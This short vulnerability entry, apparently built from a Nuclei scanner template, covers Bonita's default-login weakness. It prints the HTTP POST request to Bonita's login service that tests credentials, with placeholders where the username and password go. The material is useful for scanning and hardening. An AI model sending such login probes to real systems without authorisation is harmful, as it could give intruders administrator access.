# Vulnerability: Bonita - Default Login
**Classification:** BONITA
**Source:** Nuclei Template (`bonita-default-login.yaml`)

## Description
Bonita login was using default credentials which can led to gain super administrator access.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /bonita/loginservice?redirect=true&redirectUrl=%2Fbonita%2Fapps%2FappDirectoryBonita HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}&_l=en
```

